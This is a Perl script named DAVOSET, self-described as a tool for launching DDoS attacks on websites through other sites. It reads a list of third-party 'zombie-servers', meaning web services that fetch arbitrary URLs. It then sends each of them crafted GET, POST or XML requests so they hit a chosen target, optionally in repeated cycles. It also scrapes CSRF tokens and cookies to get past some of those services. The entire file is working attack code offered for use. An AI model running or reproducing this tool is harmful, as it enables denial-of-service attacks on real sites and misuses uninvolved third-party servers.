#!/usr/bin/perl
# DDoS attacks via other sites execution tool
# DAVOSET v.1.1.3
# Tool for conducting of DDoS attacks on the sites via other sites
# Copyright (C) MustLive 2010-2013
# Last update: 31.08.2013
# http://websecurity.com.ua
#############################################
# Settings
my $version = "1.1.3"; # program version
my $agent = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"; # user agent
my $default_port = "80"; # default port of the host
my $show_stat = 1; # show statistic of work
my $default_site = "http://site"; # default site for attack
my $testURL = "http://google.com"; # default site for testing botnet
my $list_servers = "list.txt"; # list of zombie-servers
my $mode = "0"; # 0 - standard mode, 1 - cyclic mode
my $cycles = "10"; # number of cycles in cyclic mode
my $max_cycles = "100"; # maximum number of cycles in cyclic mode
my $log = 1; # 0 - turn off , 1 - turn on logging
my $log_file = "logs.txt"; # log with results of work
#############################################
use IO::Socket;

my (@list,$input,$site,$item,$servers,$cycle,$i,$req,$time,$time1,$time2,$speed,$speed2,$sec,$traffic);

if ($#ARGV >= 0) {
	for ($i=0;$i<=$#ARGV;$i++){
		if ($ARGV[$i] =~ /^u=(.+)$/) { # URL
			$site = $1;
		}
		elsif ($ARGV[$i] =~ /^test$/) { # test
			$site = "test";
		}
		elsif ($ARGV[$i] =~ /^l=(.+)$/) { # file with list
			$list_servers = $1;
		}
		elsif ($ARGV[$i] =~ /^m=(\d)$/) { # mode
			if ($1 == 1) {
				$mode = 1;
			}
			else {
				$mode = 0;
			}
		}
		elsif ($ARGV[$i] =~ /^c=(\d+)$/) { # number of cycles
			$cycles = $1;
		}
		elsif ($ARGV[$i] =~ /^log=(\d)$/) { # logging
			if ($1 == 1) {
				$log = 1;
			}
			else {
				$log = 0;
			}
		}
	}
}

&Info;
open(FILE,"<$list_servers") || die "\nFile $list_servers not found.\n";
@list = <FILE>;
close(FILE);
foreach $item (@list) {
	chomp($item);
	if ($item) {
		$servers++;
	}
}
if (!$site) {
	print "Site: ";
	$input = <STDIN>;
	chomp($input);
	if (!$input) {
		$site = $default_site;
	}
	else {
		$site = $input;
	}
}
if ($site eq "test") {
	Logging("Test on $testURL") if $log;
	&Test;
}
$site =~ s/&/%26/g; # for correct work with zombie-servers
Logging("Attack on $site") if $log;

print "\nSite $site is attacking by $servers zombie-servers...\n\n";
$time1 = (time)[0] if $show_stat;
$cycles = 1 if (!$mode || $cycles < 1);
$cycles = $max_cycles if ($cycles > $max_cycles);
for ($cycle=0;$cycle<$cycles;$cycle++) {
	$i = 0;
	foreach $item (@list) {
		chomp($item);
		if ($item) {
			my ($url,$method,$file) = split /;/,$item;
			my $params;
			if ($method eq "POST" or $method eq "XML") {
				open(FILE,"<$file");
				$params = <FILE>;
				chomp($params);
				close(FILE);
			}
			print ++$i."\n";
			Attack($site,$url,$method,$params);
		}
	}
	$req += $i;
}
$time2 = (time)[0] if $show_stat;
print "\nAttack has been conducted.\n";
if ($show_stat) {
	$time = $time2-$time1;
	$time |= 1;
	$speed = $req/$time;
	$speed2 = length($traffic)/$time;
	$sec = $time%60;
	$sec = "0".$sec if ($sec<10);
	print "\nTime: ".int($time/60).":$sec.\n";
	print "Requests: $req, Bytes: ".length($traffic).".\n";
	printf "Speed: %0.5f req/s, %0.5f B/s.\n",$speed,$speed2;
}

sub Info { # info
	print qq~
DDoS attacks via other sites execution tool
DAVOSET v.$version
Copyright (C) MustLive 2010-2013

~;
}

sub Attack { # send request to zombie-server
	my $site = $_[0];
	my $url = $_[1];
	my $method = $_[2];
	my $params = $_[3];
	my ($sock,$host,$page,$port,$csrftoken,$cookie);

	$site =~ s|^http://|| if ($url =~ /plugin_googlemap2_proxy.php/);
	$site = "http://$site" if ($site !~ /^http:/ && $url =~ m|^http://demo.geonode.org|);
	$url =~ m|(http://[^/]+)(/.+)?|;
	$host = $1;
	$page = $2;
	$page |= "/";
	$port = $1 if ($host =~ /:(\d+)$/);
	$port ||= $default_port;
	$host =~ s|^http://||;
	if ($host eq "browsershots.org") {
		$csrftoken = &GetCsrfToken;
	}
	elsif ($host eq "ping-admin.ru") {
		$cookie = &GetCookie($page);
	}
	$sock = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$host", PeerPort => "$port");
	if (!$sock) {
		print "- The Socket: $!\n";
		return;
	}
	if ($method eq "POST") {
		$params .= $site;
		$params .= "&csrfmiddlewaretoken=$csrftoken" if $csrftoken;
		print $sock "POST $page HTTP/1.1\n";
		print $sock "Host: $host\n";
		print $sock "User-Agent: $agent\n";
		print $sock "Accept: */*\n";
		print $sock "Content-Length: ". length($params) ."\n";
		print $sock "Content-Type: application/x-www-form-urlencoded\n";
		print $sock "Cookie: csrftoken=$csrftoken\n" if $csrftoken;
		print $sock "Cookie: $cookie\n" if $cookie;
		print $sock "Connection: close\n\n";
		print $sock "$params\r\n\r\n";
	}
	elsif ($method eq "XML") {
		$params =~ s|http://site|$site|;
		print $sock "POST $page HTTP/1.1\n";
		print $sock "Host: $host\n";
		print $sock "User-Agent: $agent\n";
		print $sock "Accept: */*\n";
		print $sock "Content-Length: ". length($params) ."\n";
		print $sock "Content-Type: application/x-www-form-urlencoded\n";
		print $sock "Connection: close\n\n";
		print $sock "$params\r\n\r\n";
	}
	else {
		print $sock "GET $page$site HTTP/1.1\n";
		print $sock "Host: $host\n";
		print $sock "User-Agent: $agent\n";
		print $sock "Accept: */*\n";
		print $sock "Connection: close\r\n\r\n";
	}
	if ($show_stat) {
		if ($method eq "POST") {
			$traffic .= "POST $page HTTP/1.1\nHost: $host\nUser-Agent: $agent\nAccept: */*\nContent-Length: ". length($params) ."\nContent-Type: application/x-www-form-urlencoded\n";
			$traffic .= "Cookie: csrftoken=$csrftoken\n" if $csrftoken;
			$traffic .= "Cookie: $cookie\n" if $cookie;
			$traffic .= "Connection: close\n\n$params\r\n\r\n";
		}
		elsif ($method eq "XML") {
			$traffic .= "POST $page HTTP/1.1\nHost: $host\nUser-Agent: $agent\nAccept: */*\nContent-Length: ". length($params) ."\nContent-Type: application/x-www-form-urlencoded\nConnection: close\n\n$params\r\n\r\n";
		}
		else {
			$traffic .= "GET $page$site HTTP/1.1\nHost: $host\nUser-Agent: $agent\nAccept: */*\nConnection: close\r\n\r\n";
		}
	}
}

sub Test { # test list of zombie-servers
	print "\nThe botnet with $servers zombie-servers is checking...\n\n";
	$i = 0;
	foreach $item (@list) {
		chomp($item);
		if ($item) {
			my ($url,$method,$file) = split /;/,$item;
			my $params;
			if ($method eq "POST" or $method eq "XML") {
				open(FILE,"<$file");
				$params = <FILE>;
				chomp($params);
				close(FILE);
			}
			print ++$i." - ";
			TestServer($testURL,$url,$method,$params);
		}
	}
	exit();
}

sub TestServer { # test zombie-server
	my $site = $_[0];
	my $url = $_[1];
	my $method = $_[2];
	my $params = $_[3];
	my ($sock,$host,$page,$content,$csrftoken,$cookie);

	$site =~ s|^http://|| if ($url =~ /plugin_googlemap2_proxy.php/);
	$site = "http://$site" if ($site !~ /^http:/ && $url =~ m|^http://demo.geonode.org|);
	$url =~ m|(http://[^/]+)(/.+)?|;
	$host = $1;
	$page = $2;
	$page |= "/";
	$port = $1 if ($host =~ /:(\d+)$/);
	$port ||= $default_port;
	$host =~ s|^http://||;
	if ($host eq "browsershots.org") {
		$csrftoken = &GetCsrfToken;
	}
	elsif ($host eq "ping-admin.ru") {
		$cookie = &GetCookie($page);
	}
	$sock = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$host", PeerPort => "$port");
	if (!$sock) {
		print "The Socket: $!\n";
		return;
	}
	if ($method eq "POST") {
		$params .= $site;
		$params .= "&csrfmiddlewaretoken=$csrftoken" if $csrftoken;
		print $sock "POST $page HTTP/1.1\n";
		print $sock "Host: $host\n";
		print $sock "User-Agent: $agent\n";
		print $sock "Accept: */*\n";
		print $sock "Content-Length: ". length($params) ."\n";
		print $sock "Content-Type: application/x-www-form-urlencoded\n";
		print $sock "Cookie: csrftoken=$csrftoken\n" if $csrftoken;
		print $sock "Cookie: $cookie\n" if $cookie;
		print $sock "Connection: close\n\n";
		print $sock "$params\r\n\r\n";
	}
	elsif ($method eq "XML") {
		$params =~ s|http://site|$site|;
		print $sock "POST $page HTTP/1.1\n";
		print $sock "Host: $host\n";
		print $sock "User-Agent: $agent\n";
		print $sock "Accept: */*\n";
		print $sock "Content-Length: ". length($params) ."\n";
		print $sock "Content-Type: application/x-www-form-urlencoded\n";
		print $sock "Connection: close\n\n";
		print $sock "$params\r\n\r\n";
	}
	else {
		print $sock "GET $page$site HTTP/1.1\n";
		print $sock "Host: $host\n";
		print $sock "User-Agent: $agent\n";
		print $sock "Accept: */*\n";
		print $sock "Connection: close\r\n\r\n";
	}
	$content = "";
	while (<$sock>) {
		$content .= $_;
	}
	if ($content =~ /HTTP\/\d.\d (\d\d\d)/){
		if ($1 >= 400){
			print "Error ($1)\n";
		}
		else {
			print "OK ($1)\n";
		}
	}
	else {
		print "Error\n";
	}
}

sub GetCsrfToken { # get CSRF token
	my ($sock,$content,$csrftoken);

	$sock = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "browsershots.org", PeerPort => "$port");
	print $sock "GET / HTTP/1.1\n";
	print $sock "Host: browsershots.org\n";
	print $sock "User-Agent: $agent\n";
	print $sock "Accept: */*\n";
	print $sock "Connection: close\r\n\r\n";
	$content = "";
	while (<$sock>) {
		$content .= $_;
	}
	$csrftoken = $1 if ($content =~ /name='csrfmiddlewaretoken' value='(.+?)'/);
	if ($show_stat) {
		$traffic .= "GET / HTTP/1.1\nHost: browsershots.org\nUser-Agent: $agent\nAccept: */*\nConnection: close\r\n\r\n";
	}
	return $csrftoken;
}

sub GetCookie { # get cookie
	my $url = $_[0];
	my ($sock,$content,@cookies,$cookie);

	$url =~ s/index.sema/free_seo\//;
	$sock = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "ping-admin.ru", PeerPort => "$port");
	print $sock "GET $url HTTP/1.1\n";
	print $sock "Host: ping-admin.ru\n";
	print $sock "User-Agent: $agent\n";
	print $sock "Accept: */*\n";
	print $sock "Connection: close\r\n\r\n";
	$content = "";
	while (<$sock>) {
		$content .= $_;
	}
	while ($content =~ /Set-Cookie: (.+?=.+?); expires/g) {
		push(@cookies,$1);
	}
	$cookie = join("; ",@cookies);
	if ($show_stat) {
		$traffic .= "GET / HTTP/1.1\nHost: ping-admin.ru\nUser-Agent: $agent\nAccept: */*\nConnection: close\r\n\r\n";
	}
	return $cookie;
}

sub Logging { # Logging results of work
	my @months = ('01','02','03','04','05','06','07','08','09','10','11','12');
	my ($sec,$min,$hour,$day,$mon,$year) = (localtime(time))[0,1,2,3,4,5];
	$year += 1900;
	$sec = "0".$sec if ($sec<10);
	$min = "0".$min if ($min<10);
	$hour = "0".$hour if ($hour<10);
	$day = "0".$day if ($day<10);
	my $date = "$day.$months[$mon].$year $hour:$min:$sec";

	open(FILE, ">>$log_file");
	print FILE "$date;$_[0]\n";
	close(FILE);
}
